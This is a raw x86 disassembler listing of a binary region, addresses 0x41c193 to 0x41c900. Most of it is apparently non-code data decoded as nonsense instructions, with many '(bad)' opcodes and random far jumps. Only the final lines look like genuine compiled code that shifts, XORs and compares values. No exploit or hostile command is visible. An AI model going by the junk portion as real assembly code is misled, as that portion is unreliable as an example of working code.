  41c193:	hlt    
  41c194:	xchg   al,bl
  41c196:	nop
  41c197:	addr16 ret 0x8ce7
  41c19b:	es cli 
  41c19d:	mov    ds:0xd8c70aed,al
  41c1a2:	pop    ecx
  41c1a3:	(bad)  
  41c1a5:	jl     0x41c162
  41c1a7:	or     esp,DWORD PTR [eax+0x74546457]
  41c1ad:	cdq    
  41c1ae:	rcl    al,cl
  41c1b0:	jno    0x41c1b6
  41c1b2:	sti    
  41c1b3:	mov    ah,0xc3
  41c1b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1b6:	sti    
  41c1b7:	pop    edx
  41c1b8:	push   esi
  41c1b9:	xchg   esp,eax
  41c1ba:	out    dx,eax
  41c1bb:	dec    esi
  41c1bc:	gs out 0x3c,al
  41c1bf:	lea    ecx,ds:0x919e87ca
  41c1c5:	dec    eax
  41c1c6:	fiadd  DWORD PTR [ebx+edx*1+0x8623aba]
  41c1cd:	fdiv   st,st(2)
  41c1cf:	sub    bh,BYTE PTR [esi]
  41c1d1:	sub    al,0x51
  41c1d3:	and    eax,0xc0399242
  41c1d8:	lahf   
  41c1d9:	and    bh,0xdc
  41c1dc:	pop    ss
  41c1dd:	jg     0x41c1cd
  41c1df:	loope  0x41c1a7
  41c1e1:	pop    ecx
  41c1e2:	out    dx,al
  41c1e3:	and    eax,0x74cabeb0
  41c1e8:	mov    esp,0xa3dfa945
  41c1ed:	and    al,0xdd
  41c1ef:	fwait
  41c1f0:	sar    eax,cl
  41c1f2:	add    eax,DWORD PTR [ecx-0x38cc8a00]
  41c1f8:	jns    0x41c277
  41c1fa:	mov    bl,0x20
  41c1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1fd:	jmp    FWORD PTR [eax+0x32d214ad]
  41c203:	mov    esp,0x87312ae1
  41c208:	jle    0x41c1f6
  41c20a:	(bad)  
  41c20b:	cmp    al,0x72
  41c20d:	mov    esi,0x2da5d50b
  41c212:	add    BYTE PTR [edx+ecx*1+0x4dda4730],dl
  41c219:	in     al,0x6e
  41c21b:	sub    ch,bl
  41c21d:	jle    0x41c264
  41c21f:	outs   dx,BYTE PTR ds:[esi]
  41c220:	fisubr WORD PTR [edx+0x77]
  41c223:	dec    ebx
  41c224:	ror    ebp,1
  41c226:	mov    ch,0x14
  41c228:	(bad)  
  41c229:	cli    
  41c22a:	ret    
  41c22b:	inc    ebp
  41c22c:	adc    al,0xc7
  41c22e:	cmc    
  41c22f:	leave  
  41c230:	inc    esi
  41c231:	(bad)  
  41c232:	fimul  DWORD PTR [ebp+0x72]
  41c235:	bsf    esi,ebx
  41c238:	rcl    BYTE PTR [ebx-0x7c],cl
  41c23b:	mov    dl,BYTE PTR [edx+ecx*2]
  41c23e:	jmp    0x74c1:0xacd360d7
  41c245:	ss lock out 0x29,al
  41c249:	loope  0x41c1d2
  41c24b:	lea    esp,[edx]
  41c24d:	addr16 js 0x41c295
  41c250:	xlat   BYTE PTR ds:[ebx]
  41c251:	mov    al,ds:0xc170062b
  41c256:	cmp    al,0x87
  41c258:	inc    ecx
  41c259:	adc    ebx,esi
  41c25b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c25d:	sub    al,0xf4
  41c25f:	lds    ebp,FWORD PTR [edi+eiz*1+0x512f665c]
  41c266:	and    BYTE PTR [eax+0x77a4316e],ah
  41c26c:	dec    eax
  41c26d:	std    
  41c26e:	scas   al,BYTE PTR es:[edi]
  41c26f:	sbb    al,0x5d
  41c271:	xchg   ecx,eax
  41c272:	mov    esi,0x726c69a
  41c277:	rcr    BYTE PTR [ecx-0x32],cl
  41c27a:	pop    eax
  41c27b:	fs div dh
  41c27e:	or     bl,bl
  41c280:	add    BYTE PTR [edx-0x6b],ch
  41c283:	dec    edi
  41c284:	div    BYTE PTR [ebx-0x80]
  41c287:	fwait
  41c288:	mov    edx,0x8b676b14
  41c28d:	inc    ebp
  41c28e:	dec    edi
  41c28f:	sbb    ah,BYTE PTR [esi+0x46]
  41c292:	xchg   BYTE PTR [edi+0x69],bh
  41c295:	test   eax,0x102a38d8
  41c29a:	inc    eax
  41c29b:	push   ecx
  41c29c:	pushf  
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	dec    edi
  41c29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2a0:	xchg   DWORD PTR [ecx],esp
  41c2a2:	mov    BYTE PTR [ecx-0x12],0xf4
  41c2a6:	xchg   esi,eax
  41c2a7:	jo     0x41c328
  41c2a9:	enter  0xb7e1,0x4b
  41c2ad:	add    eax,0x2cce1338
  41c2b2:	enter  0xd259,0xb5
  41c2b6:	xchg   DWORD PTR [ebp+0x37],ecx
  41c2b9:	or     dl,ah
  41c2bb:	xor    eax,0xe3eb9c66
  41c2c0:	push   ecx
  41c2c1:	jecxz  0x41c2c5
  41c2c3:	cmp    BYTE PTR [ecx-0x73767fd],0x86
  41c2ca:	pop    ebp
  41c2cb:	rcr    DWORD PTR [edi+0x2f],1
  41c2ce:	aas    
  41c2cf:	add    esi,DWORD PTR [edx-0x5d]
  41c2d2:	ins    BYTE PTR es:[edi],dx
  41c2d3:	push   ss
  41c2d4:	pop    edi
  41c2d5:	movaps XMMWORD PTR [ebx],xmm0
  41c2d8:	iretw  
  41c2da:	jle    0x41c33e
  41c2dc:	push   eax
  41c2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2de:	xchg   esi,eax
  41c2df:	adc    eax,0x2346e4c6
  41c2e4:	sbb    esp,edi
  41c2e6:	mov    edx,0xeecac281
  41c2eb:	push   edi
  41c2ec:	push   0xffffffb5
  41c2ee:	sahf   
  41c2ef:	cli    
  41c2f0:	(bad)  
  41c2f1:	out    0x95,eax
  41c2f3:	sbb    BYTE PTR [eax+esi*2-0x46],ch
  41c2f7:	pop    eax
  41c2f8:	mov    ds:0x8f937f82,al
  41c2fd:	push   es
  41c2fe:	scas   al,BYTE PTR es:[edi]
  41c2ff:	inc    eax
  41c300:	aaa    
  41c301:	dec    eax
  41c302:	mov    ebp,cs
  41c304:	inc    ebp
  41c305:	mov    edx,0xa8538c13
  41c30a:	out    0x1b,al
  41c30c:	xchg   esp,eax
  41c30d:	add    eax,0x9617cd98
  41c312:	mov    ?,WORD PTR [edi+0x7982042]
  41c318:	ja     0x41c2ff
  41c31a:	daa    
  41c31b:	sbb    al,0xc9
  41c31d:	in     eax,0xd3
  41c31f:	into   
  41c320:	push   edi
  41c321:	lahf   
  41c322:	cli    
  41c323:	ja     0x41c38c
  41c325:	cmp    al,0x7c
  41c327:	ds xor eax,0xd004d67
  41c32d:	pushf  
  41c32e:	jle    0x41c359
  41c330:	push   es
  41c331:	dec    eax
  41c332:	out    0x8b,al
  41c334:	adc    ecx,DWORD PTR [eax-0x62bebf6f]
  41c33a:	sti    
  41c33b:	mov    dl,0x7f
  41c33d:	jecxz  0x41c31a
  41c33f:	leave  
  41c340:	jae    0x41c39b
  41c342:	inc    ebx
  41c343:	lea    ecx,[esi+0x25ae86fb]
  41c349:	fisttp WORD PTR [ebx-0x5feeb641]
  41c34f:	and    bl,BYTE PTR [edx+0x5b]
  41c352:	cli    
  41c353:	out    dx,eax
  41c354:	jg     0x41c37e
  41c356:	push   es
  41c357:	pop    ss
  41c358:	jno    0x41c372
  41c35a:	lock pop ebx
  41c35c:	add    al,0x98
  41c35e:	add    DWORD PTR [esi+ecx*2-0x7bc87983],esp
  41c365:	adc    BYTE PTR [edx],ch
  41c367:	dec    ebx
  41c368:	es push edx
  41c36a:	data16 sbb BYTE PTR [eax],dh
  41c36d:	mov    ebx,0xc65669d0
  41c372:	push   esp
  41c373:	pop    ebp
  41c374:	(bad)  
  41c375:	div    DWORD PTR [esi+0x63]
  41c378:	sbb    DWORD PTR [ebp+0x67],ebx
  41c37b:	mov    ecx,0x9248dfb4
  41c380:	shr    BYTE PTR [esi],cl
  41c382:	mov    edi,0xa2cf6a63
  41c387:	jnp    0x41c3ae
  41c389:	cmp    al,ch
  41c38b:	sti    
  41c38c:	and    eax,0x4c99f215
  41c391:	mov    ah,0x3d
  41c393:	pop    eax
  41c394:	fucomip st,st(5)
  41c396:	imul   DWORD PTR ds:0xefe65d56
  41c39c:	jo     0x41c3a9
  41c39e:	stc    
  41c39f:	cmp    DWORD PTR [esi-0x3a522212],edi
  41c3a5:	mov    dl,0xf1
  41c3a7:	jg     0x41c3f2
  41c3a9:	cwde   
  41c3aa:	sahf   
  41c3ab:	ja     0x41c347
  41c3ad:	dec    esi
  41c3ae:	jns    0x41c34d
  41c3b0:	or     eax,0x5e6e4877
  41c3b5:	dec    eax
  41c3b6:	pop    esp
  41c3b7:	mov    ah,0x7b
  41c3b9:	sbb    DWORD PTR [eax+0x37cadc95],esp
  41c3bf:	inc    esp
  41c3c0:	jb     0x41c3c5
  41c3c2:	and    ebx,DWORD PTR es:[edi-0x5506e339]
  41c3c9:	daa    
  41c3ca:	mov    dl,0x2a
  41c3cc:	mov    esp,0x79ad5f3c
  41c3d1:	enter  0x5a71,0x7f
  41c3d5:	test   ah,bh
  41c3d7:	pop    esp
  41c3d8:	retf   
  41c3d9:	jae    0x41c3fa
  41c3db:	stc    
  41c3dc:	push   DWORD PTR [edi]
  41c3de:	stos   BYTE PTR es:[edi],al
  41c3df:	ins    BYTE PTR es:[edi],dx
  41c3e0:	xchg   edx,eax
  41c3e1:	ds iret 
  41c3e3:	ret    0x57d1
  41c3e6:	push   DWORD PTR [esi+0x4b]
  41c3e9:	lods   eax,DWORD PTR ds:[esi]
  41c3ea:	cmp    edi,edi
  41c3ec:	imul   esp,DWORD PTR [esi],0xffffffa8
  41c3ef:	jne    0x41c435
  41c3f1:	mov    dl,0x4a
  41c3f3:	test   eax,0x538f5a22
  41c3f8:	mov    ds:0x95997b5a,al
  41c3fd:	rcl    BYTE PTR [edi+0x60],cl
  41c400:	or     eax,0xa5f55200
  41c405:	repz in al,0x97
  41c408:	test   eax,0x6f762745
  41c40d:	mov    ecx,ebx
  41c40f:	mov    al,0xc
  41c411:	inc    edx
  41c412:	cmp    DWORD PTR [esi+ebx*4+0x131f7dd0],esi
  41c419:	cmp    eax,0x54ad1d0c
  41c41e:	push   ss
  41c41f:	or     edx,ebp
  41c421:	or     bl,BYTE PTR [edx-0x1e]
  41c424:	push   cs
  41c425:	fwait
  41c426:	mov    edx,0xf6416de
  41c42b:	mov    BYTE PTR [edi+0xa],al
  41c42e:	cwde   
  41c42f:	push   ds
  41c430:	push   ebx
  41c431:	lods   al,BYTE PTR ds:[esi]
  41c432:	stc    
  41c433:	and    dl,ch
  41c435:	cmp    al,0xfb
  41c437:	lock (bad) 
  41c43a:	push   edi
  41c43b:	cmp    DWORD PTR [esi-0x25],ebx
  41c43e:	lock jns 0x41c487
  41c441:	(bad)  
  41c442:	fdivr  QWORD PTR [ecx-0x43]
  41c445:	xchg   esp,eax
  41c446:	js     0x41c474
  41c448:	les    ebx,FWORD PTR [edx-0x58]
  41c44b:	jecxz  0x41c4c0
  41c44d:	cs loope 0x41c48f
  41c450:	mov    eax,ds:0x4b23ca61
  41c455:	push   cs
  41c456:	sub    eax,DWORD PTR [edi-0x673efe8a]
  41c45c:	or     ch,ah
  41c45e:	daa    
  41c45f:	pop    eax
  41c460:	pop    esi
  41c461:	out    dx,eax
  41c462:	std    
  41c463:	rol    esp,0xc9
  41c466:	pop    ds
  41c467:	pop    eax
  41c468:	ret    
  41c469:	aad    0xcd
  41c46b:	push   0x6d2f76d2
  41c470:	dec    eax
  41c471:	pop    ds
  41c472:	push   cs
  41c473:	and    ah,BYTE PTR [edi+0x22d1aa4e]
  41c479:	fadd   DWORD PTR [eax-0x4d]
  41c47c:	gs int 0x5c
  41c47f:	arpl   WORD PTR [ebx-0x55],di
  41c482:	jae    0x41c449
  41c484:	repnz lea ecx,[esi-0x6b2fc091]
  41c48b:	mov    WORD PTR [eax+esi*1+0x425ff1bb],?
  41c492:	arpl   dx,sp
  41c494:	fmul   QWORD PTR [ebx+eiz*8]
  41c497:	pop    ds
  41c498:	ins    DWORD PTR es:[edi],dx
  41c499:	mov    al,0x8f
  41c49b:	icebp  
  41c49c:	mov    BYTE PTR [ecx],0x50
  41c49f:	push   eax
  41c4a0:	sub    DWORD PTR [edx],0x64dea33d
  41c4a6:	(bad)  
  41c4a8:	sbb    dl,BYTE PTR ds:0x8d197bac
  41c4ae:	mov    cl,0x6
  41c4b0:	out    0x75,eax
  41c4b2:	dec    eax
  41c4b3:	imul   ebp,eax,0x1c
  41c4b6:	mov    edi,edi
  41c4b8:	(bad)  
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4da
  41c4cb:	mov    ds:0x734abca9,al
  41c4d0:	push   ss
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x39a81818],bh
  41c4d8:	push   eax
  41c4d9:	loope  0x41c507
  41c4db:	aas    
  41c4dc:	cmp    esi,DWORD PTR [ebx]
  41c4de:	sub    ah,BYTE PTR [ecx]
  41c4e0:	add    eax,0x14190244
  41c4e5:	mov    dh,BYTE PTR [edi]
  41c4e7:	push   ss
  41c4e8:	dec    ebp
  41c4e9:	dec    eax
  41c4ea:	rcl    BYTE PTR [ebx+0x1fc7b010],0xdf
  41c4f1:	scas   al,BYTE PTR es:[edi]
  41c4f2:	pop    eax
  41c4f3:	(bad)  
  41c4f4:	pop    ss
  41c4f5:	adc    cl,al
  41c4f7:	or     BYTE PTR [edx+0x78a7d34a],bl
  41c4fd:	out    0xf,al
  41c4ff:	mov    esp,0x52aff5d4
  41c504:	mov    edx,0xd0f3c32c
  41c509:	inc    eax
  41c50a:	sub    al,BYTE PTR [esi+edi*4+0x44e96c94]
  41c511:	sar    BYTE PTR [ecx-0x12b46669],1
  41c517:	(bad)  
  41c518:	clc    
  41c519:	jg     0x41c4a5
  41c51b:	shl    DWORD PTR [edx],0x41
  41c51e:	pusha  
  41c51f:	(bad)  
  41c520:	fidiv  WORD PTR [edx*8-0x7a9ebedb]
  41c527:	dec    ebp
  41c528:	lahf   
  41c529:	and    al,0xa9
  41c52b:	jb     0x41c599
  41c52d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c52e:	mov    dh,0x51
  41c530:	pushf  
  41c531:	jno    0x41c4bc
  41c533:	addr16 dec ecx
  41c535:	in     eax,dx
  41c536:	jns    0x41c58b
  41c538:	or     al,0xdd
  41c53a:	xchg   edx,edx
  41c53c:	in     eax,dx
  41c53d:	or     esp,DWORD PTR [eax+eiz*4]
  41c540:	inc    eax
  41c541:	iret   
  41c542:	mov    bh,al
  41c544:	xchg   sp,ax
  41c546:	xor    bh,BYTE PTR [esi-0x19ce86bd]
  41c54c:	mov    ds:0x4710fa9e,al
  41c551:	lahf   
  41c552:	inc    esp
  41c553:	pop    eax
  41c554:	jmp    0x87d:0x5368ec99
  41c55b:	aam    0xd2
  41c55d:	xor    eax,0xd1e0dee7
  41c562:	pushf  
  41c563:	(bad)  
  41c564:	in     al,dx
  41c565:	or     eax,0x5d625d32
  41c56a:	sub    esi,esp
  41c56c:	push   0x8c3a5685
  41c571:	out    0xe,eax
  41c573:	jno    0x41c53b
  41c575:	dec    ecx
  41c576:	or     eax,0x6e11f626
  41c57b:	test   BYTE PTR [edi+0x249e9079],bh
  41c581:	or     ebp,DWORD PTR [ebx-0x51ffe061]
  41c587:	repnz test ebp,ecx
  41c58a:	push   edx
  41c58b:	sahf   
  41c58c:	stos   DWORD PTR es:[edi],eax
  41c58d:	lods   al,BYTE PTR ds:[esi]
  41c58e:	xor    eax,0x7cedf880
  41c593:	add    ah,dl
  41c595:	or     cl,bl
  41c597:	and    BYTE PTR [edx-0x6b],al
  41c59a:	bound  edx,QWORD PTR [ecx]
  41c59c:	mov    DWORD PTR [eax-0x4901ba3d],0x29991219
  41c5a6:	pop    edx
  41c5a7:	pop    edi
  41c5a8:	pop    esi
  41c5a9:	adc    esi,DWORD PTR [esi+0x5f277e2]
  41c5af:	mov    ebx,0xc21a4140
  41c5b4:	xchg   ecx,eax
  41c5b5:	loop   0x41c622
  41c5b7:	or     ch,cl
  41c5b9:	(bad)
  41c5bd:	mov    cl,0x6d
  41c5bf:	test   eax,0xe40c4420
  41c5c4:	popa   
  41c5c5:	loop   0x41c631
  41c5c7:	out    0xaa,al
  41c5c9:	sete   BYTE PTR [esi+0x2d]
  41c5cd:	aad    0x5a
  41c5cf:	pop    eax
  41c5d0:	int    0xc2
  41c5d2:	and    ebp,edi
  41c5d4:	and    edx,0x63
  41c5d7:	(bad)  
  41c5d8:	push   edx
  41c5d9:	js     0x41c581
  41c5db:	or     eax,0x4a91690b
  41c5e0:	cmp    esp,DWORD PTR [edx-0x3fc10410]
  41c5e6:	ret    0x625c
  41c5e9:	je     0x41c5ef
  41c5eb:	dec    edx
  41c5ec:	into   
  41c5ed:	imul   edi,DWORD PTR [ecx-0x268c691a],0x20ee1c4d
  41c5f7:	arpl   WORD PTR [ebx],di
  41c5f9:	mov    DWORD PTR [ecx+0x6f5979eb],esp
  41c5ff:	pop    eax
  41c600:	xor    al,0x7a
  41c602:	outs   dx,DWORD PTR ds:[esi]
  41c603:	jl     0x41c5f6
  41c605:	psubw  mm6,QWORD PTR [ebp*1-0x465273c0]
  41c60d:	mov    eax,ds:0x29f6c593
  41c612:	les    ebx,FWORD PTR [ebx+0x13]
  41c615:	loopne 0x41c5c4
  41c617:	xchg   ebx,eax
  41c618:	ins    BYTE PTR es:[edi],dx
  41c619:	daa    
  41c61a:	pop    ds
  41c61b:	xchg   esp,eax
  41c61c:	inc    ecx
  41c61d:	popf   
  41c61e:	mov    ds,WORD PTR [esi-0x65]
  41c621:	jb     0x41c67d
  41c623:	retf   0x9b19
  41c626:	xor    BYTE PTR [edi],dl
  41c628:	iret   
  41c629:	jo     0x41c688
  41c62b:	lock (bad) 
  41c62e:	lods   eax,DWORD PTR ds:[esi]
  41c62f:	adc    bl,ah
  41c631:	fcomp  st(3)
  41c633:	mov    dh,0xce
  41c635:	inc    ebp
  41c636:	hlt    
  41c637:	stos   BYTE PTR es:[edi],al
  41c638:	and    al,0x4d
  41c63a:	pop    ds
  41c63b:	jmp    0x41c630
  41c63d:	push   edx
  41c63e:	retf   0x83bd
  41c641:	adc    al,0x8f
  41c643:	stos   BYTE PTR es:[edi],al
  41c644:	fsub   DWORD PTR [edx-0x47]
  41c647:	sbb    al,0xa9
  41c649:	xchg   BYTE PTR [edx],dh
  41c64b:	(bad)  
  41c64c:	push   ss
  41c64d:	iret   
  41c64e:	push   ecx
  41c64f:	or     ebp,DWORD PTR [esi+edi*2+0x69]
  41c653:	sbb    al,0x7
  41c655:	xchg   ebx,eax
  41c656:	fimul  WORD PTR [edi+ebp*8+0x7dedb6bd]
  41c65d:	sahf   
  41c65e:	scas   eax,DWORD PTR es:[edi]
  41c65f:	mov    edx,0x5e6a6c8a
  41c664:	ja     0x41c6a2
  41c666:	mov    dl,0x28
  41c668:	jle    0x41c6d3
  41c66a:	sub    esi,eax
  41c66c:	scas   eax,DWORD PTR es:[edi]
  41c66d:	pushf  
  41c66e:	dec    esp
  41c66f:	adc    DWORD PTR [eax+0x48223197],0x8691e5db
  41c679:	and    al,dh
  41c67b:	xchg   esp,eax
  41c67c:	dec    eax
  41c67d:	dec    esp
  41c67e:	mov    bl,BYTE PTR [eax]
  41c680:	bound  ebp,QWORD PTR [ebp-0x54]
  41c683:	sub    BYTE PTR [eax-0x6],dh
  41c686:	scas   eax,DWORD PTR es:[edi]
  41c687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c688:	jmp    0x41c6bb
  41c68a:	dec    ebp
  41c68b:	cwde   
  41c68c:	mov    dh,0x38
  41c68e:	pop    ds
  41c68f:	jecxz  0x41c69e
  41c691:	jbe    0x41c681
  41c693:	ss mov ah,0xf6
  41c696:	xchg   edx,eax
  41c697:	cmc    
  41c698:	and    ebp,edx
  41c69a:	neg    DWORD PTR [edx]
  41c69c:	sbb    DWORD PTR [ebx+0x187388bb],edi
  41c6a2:	mov    bh,BYTE PTR [ecx-0x21d3e140]
  41c6a8:	xor    cl,BYTE PTR [eax-0x44]
  41c6ab:	dec    ebp
  41c6ac:	icebp  
  41c6ad:	or     DWORD PTR gs:[ecx+esi*8],ecx
  41c6b1:	fistp  DWORD PTR [edi-0x64694fed]
  41c6b7:	push   edi
  41c6b8:	sti    
  41c6b9:	ja     0x41c6ba
  41c6bb:	mov    edx,0x2783b52f
  41c6c0:	and    DWORD PTR [edx-0x49],esi
  41c6c3:	arpl   si,sp
  41c6c5:	mov    al,0x9a
  41c6c7:	ret    
  41c6c8:	test   eax,0xcffaaafa
  41c6cd:	std    
  41c6ce:	xor    BYTE PTR [ecx+0x34],dl
  41c6d1:	jne    0x41c732
  41c6d3:	sbb    DWORD PTR [esi],ebx
  41c6d5:	jmp    0xc7f6eef2
  41c6da:	cmp    DWORD PTR [ecx+ebx*2+0x2afd13dc],0xffffffbb
  41c6e2:	dec    edi
  41c6e3:	(bad)  
  41c6e5:	in     eax,dx
  41c6e6:	sub    dh,BYTE PTR [ecx-0x798d2949]
  41c6ec:	loope  0x41c71c
  41c6ee:	adc    dl,BYTE PTR [ebp+edx*8-0x1b]
  41c6f2:	(bad)  
  41c6f3:	or     dh,BYTE PTR [edx]
  41c6f5:	in     al,dx
  41c6f6:	mov    ebx,0x298d877d
  41c6fb:	dec    ebx
  41c6fc:	loop   0x41c6ff
  41c6fe:	ds test bl,dh
  41c701:	rcr    BYTE PTR [ecx-0x63],cl
  41c704:	mov    dh,0x8a
  41c706:	mov    eax,ds:0xe4f0158f
  41c70b:	cwde   
  41c70c:	mov    ds:0x760e84a3,eax
  41c711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c712:	pop    es
  41c713:	sbb    dh,ch
  41c715:	or     esi,DWORD PTR [ebx-0x4bdcd48f]
  41c71b:	jne    0x41c69d
  41c71d:	call   0x871e:0x34f7d1d2
  41c724:	mov    ch,0x97
  41c726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c727:	sahf   
  41c728:	xchg   ah,ah
  41c72a:	pop    ss
  41c72b:	arpl   WORD PTR [ecx-0x57087254],si
  41c731:	enter  0xbb96,0xd1
  41c735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c736:	data16 add al,0xb9
  41c739:	adc    cl,bh
  41c73b:	dec    ebx
  41c73c:	cmp    al,0x9
  41c73e:	pop    ebx
  41c73f:	jmp    0x8e41:0x6845c49d
  41c746:	dec    ebp
  41c747:	mov    al,0xf0
  41c749:	aad    0x24
  41c74b:	leave  
  41c74c:	out    0x6c,al
  41c74e:	(bad)  
  41c74f:	mov    ebp,0x127900ae
  41c754:	sbb    al,BYTE PTR [edi]
  41c756:	jmp    0xba0b:0x9baf1a7d
  41c75d:	test   BYTE PTR [ebp-0x19ac57a6],ah
  41c763:	push   esp
  41c764:	sbb    BYTE PTR [eax],cl
  41c766:	add    dh,BYTE PTR [edi]
  41c768:	dec    eax
  41c769:	fucomi st,st(0)
  41c76b:	pushf  
  41c76c:	frstor [ebx]
  41c76e:	mov    BYTE PTR ds:0x99b3fc6b,cl
  41c774:	out    0xa6,eax
  41c776:	push   esp
  41c777:	and    esi,ebp
  41c779:	jmp    DWORD PTR [esp+ebx*2-0x25]
  41c77d:	dec    ecx
  41c77e:	fisttp QWORD PTR [edi+eiz*4-0x60185864]
  41c785:	xor    esi,DWORD PTR [esi+0x21]
  41c788:	retf   0xb624
  41c78b:	outs   dx,BYTE PTR ds:[esi]
  41c78c:	mov    edi,0xfac34387
  41c791:	scas   al,BYTE PTR es:[edi]
  41c792:	sahf   
  41c793:	fdivr  DWORD PTR [edi-0x569cab27]
  41c799:	in     al,dx
  41c79a:	xchg   edx,eax
  41c79c:	(bad)
  41c7a0:	rep stos DWORD PTR es:[edi],eax
  41c7a2:	sbb    al,0x1c
  41c7a4:	xchg   edi,eax
  41c7a5:	dec    edx
  41c7a6:	pop    ebp
  41c7a7:	jno    0x41c793
  41c7a9:	(bad)  
  41c7aa:	jae    0x41c7a8
  41c7ac:	jmp    0x41c786
  41c7ae:	cli    
  41c7af:	push   0x23
  41c7b1:	mov    ecx,0x20db571a
  41c7b6:	in     eax,dx
  41c7b7:	addr16 pop ecx
  41c7b9:	js     0x41c76b
  41c7bb:	fistp  QWORD PTR [ebx-0x4d96f90c]
  41c7c1:	pop    ebx
  41c7c2:	sbb    al,0x81
  41c7c4:	loope  0x41c7d8
  41c7c6:	clc    
  41c7c7:	lahf   
  41c7c8:	push   ebx
  41c7c9:	(bad)  
  41c7ca:	into   
  41c7cb:	xor    DWORD PTR [esp+eax*1],ebx
  41c7ce:	fs fs mov ebx,0x6465f33b
  41c7d5:	mov    bh,BYTE PTR [eax]
  41c7d7:	and    ch,BYTE PTR [ecx+0x7eb2ea3e]
  41c7dd:	hlt    
  41c7de:	mov    esi,0x4b5b5cfc
  41c7e3:	mov    eax,0xf6b2b92f
  41c7e8:	aas    
  41c7e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7ea:	xchg   edi,eax
  41c7eb:	pushf  
  41c7ec:	xchg   esi,eax
  41c7ed:	inc    ecx
  41c7ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7ef:	aas    
  41c7f0:	jle    0x41c867
  41c7f2:	dec    ecx
  41c7f3:	fsubr  DWORD PTR [esi+esi*8-0x2f]
  41c7f7:	jae    0x41c825
  41c7f9:	stos   DWORD PTR es:[edi],eax
  41c7fa:	ror    edi,1
  41c7fc:	xchg   ebx,eax
  41c7fd:	pushf  
  41c7fe:	arpl   si,sp
  41c800:	inc    eax
  41c801:	enter  0xe070,0x79
  41c805:	push   edx
  41c806:	into   
  41c807:	inc    ebx
  41c808:	sub    BYTE PTR [edi],dh
  41c80a:	cmp    eax,0xee3474a4
  41c80f:	push   edx
  41c810:	or     eax,0x4fa56926
  41c815:	push   ebx
  41c816:	jae    0x41c7ec
  41c818:	outs   dx,DWORD PTR ds:[esi]
  41c819:	sbb    al,0xee
  41c81b:	jne    0x41c7b0
  41c81d:	jns    0x41c7d5
  41c81f:	in     al,0xfc
  41c821:	(bad)  
  41c822:	retf   0x4d08
  41c825:	imul   edx,DWORD PTR [edx-0x3c],0xe
  41c829:	xor    eax,0xa8477302
  41c82e:	adc    bh,BYTE PTR [esi]
  41c830:	push   es
  41c831:	add    al,0x22
  41c833:	cwde   
  41c834:	xchg   esi,eax
  41c835:	je     0x41c82d
  41c837:	call   esp
  41c839:	mov    ?,WORD PTR [esi-0x57]
  41c83c:	(bad)  
  41c83d:	scas   al,BYTE PTR es:[edi]
  41c83e:	cmp    eax,0x721b46d4
  41c843:	bound  ebx,QWORD PTR [ebp+0x140cd2c9]
  41c849:	lahf   
  41c84a:	sub    DWORD PTR [edi],edx
  41c84c:	in     al,dx
  41c84d:	leave  
  41c84e:	aam    0x56
  41c850:	add    edx,DWORD PTR [esi]
  41c852:	cmp    eax,DWORD PTR [edi+0x1c]
  41c855:	cmp    dh,BYTE PTR [eax]
  41c857:	repz jbe 0x41c854
  41c85a:	rcl    BYTE PTR [ecx+edx*4+0x14],0x89
  41c85f:	xchg   BYTE PTR [ebx-0x23ba030d],dh
  41c865:	add    cl,0x46
  41c868:	jbe    0x41c8ac
  41c86a:	enter  0x9daa,0xf5
  41c86e:	sbb    eax,0x72838e33
  41c873:	jbe    0x41c8f2
  41c875:	jecxz  0x41c803
  41c877:	je     0x41c8d6
  41c879:	ins    BYTE PTR es:[edi],dx
  41c87a:	cmp    DWORD PTR [eax-0x35],ebx
  41c87d:	call   0x2289:0xb0a26069
  41c884:	call   0x2474:0xff063166
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
